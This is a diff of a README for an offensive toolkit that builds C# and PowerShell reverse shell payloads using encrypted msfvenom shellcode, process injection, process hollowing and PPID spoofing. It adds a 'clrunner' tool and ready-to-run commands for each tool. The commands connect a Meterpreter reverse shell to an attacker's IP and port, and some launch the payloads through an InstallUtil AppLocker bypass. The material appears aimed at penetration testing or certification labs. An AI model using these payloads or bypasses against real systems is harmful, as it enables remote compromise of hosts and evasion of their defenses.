@@ -5,8 +5,9 @@
 | Application | Output | Notes |
 | ----------- | ------ | ----- |
 | `D_invoke/` | EXE | C# project that produces [D/invoke](https://github.com/TheWover/DInvoke) payloads |
-| `clinject/` | EXE | C# project that has been modified to accept command line args for an **injected** reverse shell process |
-| `clhollow/` | EXE | C# project that has been modified to accept command line args for an **hollowed** reverse shell process |
+| `clrunner/` | EXE | C# project that has been modified to accept command line args for a reverse shell **injected** into the **current** process |
+| `clinject/` | EXE | C# project that has been modified to accept command line args for a reverse shell **injected** into a **running** process |
+| `clhollow/` | EXE | C# project that has been modified to accept command line args for a reverse shell **hollowed** into a **new** process |
 | `powershell/Powerinject.py` | PS | Python3 script to generate .PS1 payloads that perform process injection. |
 | `powershell/Powerhollow.py` | PS | Python3 script to generate .PS1 payloads that perform process hollowing with PPID spoofing |
 | `formatters/port_ipeggs.py` | TXT | Python3 script to format C# shellcode output by msfvenom into proper format for use with `Powerinject` & `Powerhollow` |
@@ -26,19 +27,47 @@ This was accomplished by using Msfvenom to create shellcode and then locating th
 This shellcode was then AES encrypted and placed in the C# project.  On run time, the shellcode is decrypted and then the IP and port given by the attacker is converted to hex and placed in the proper location wthin the decyrpted shellcode as marked by the unique identifer strings.
 
 > TODO: Original author notes that `port_ipeggs.py` "Does not work with all payloads. Confirmed works with reverse_tcp, confirmed DOES NOT work with HTTPS". This could be why the HTTPs payloads in `/bins/` don't work. FIX.
+> 
+> Could also be related to the bug in the Meterpreter HTTPS payload a while back.
+
+### clrunner Usage
+
+C# project source code for (IP + Port) cli passed shellcode runner. Useful for when there are no processes that you can inject into or spoof PPIDs of (fairly often in initial access scenarios on servers). Use `multi/handler` with `windows/x64/meterpreter/reverse_tcp`.
+> NOTE: The process you run it from will stall until you exit the shell, or kill the spawning process itself.
+```bat
+:: normal
+clrunner.exe 192.168.1.198 53
+
+:: installUtil AppLocker Bypass
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /rhost=192.168.45.241 /rport=53 /U C:\Users\Administrator\Desktop\clrunner.exe
+```
 
 ### clinject Usage
-C# project source code for (IP + port + process) cli passed process injection payload. Use `multi/handler` with `windows/x64/meterpreter/reverse_tcp`
-```cmd
+
+C# project source code for (IP + port + process) cli passed process injection payload. Use `multi/handler` with `windows/x64/meterpreter/reverse_tcp`.
+```bat
+:: normal
 clinject.exe 192.168.1.198 443 explorer
+
+:: installUtil AppLocker Bypass
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /rhost=192.168.45.241 /rport=53 /process=explorer /U C:\Users\Administrator\Desktop\clinject.exe
 ```
 
 ### clhollow Usage
 
-C# project source code for (IP + port + process + parent-process) cli passed process hollowing payload. Use `multi/handler` with `windows/x64/meterpreter/reverse_tcp`
-```cmd
-clhollow.exe 192.168.1.198 443 c:\\windows\\system32\\svchost.exe explorer 
+C# project source code for (IP + port + process + parent-process) cli passed process hollowing payload. Use `multi/handler` with `windows/x64/meterpreter/reverse_tcp`.
+> NOTE: If the target hollow process is in the PATH environment variable, you can use the shorthand. e.g. `svchost` could replace the below path.
+```bat
+:: normal
+clhollow.exe 192.168.1.198 443 c:\\windows\\system32\\svchost.exe explorer
+
+:: installUtil AppLocker Bypass
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /rhost=192.168.45.241 /rport=53 /process=svchost /parent=explorer /U C:\Users\Administrator\Desktop\clhollow.exe
 ```
+
+### Updates from OSEP-Tools Version
+- Added `clrunner`
+- Added InstallUtil uninstall bypass to all
 
 ## [powerhollow.py](./powershell/powerhollow.py) and [powerinject.py](./powershell/powerinject.py)
 
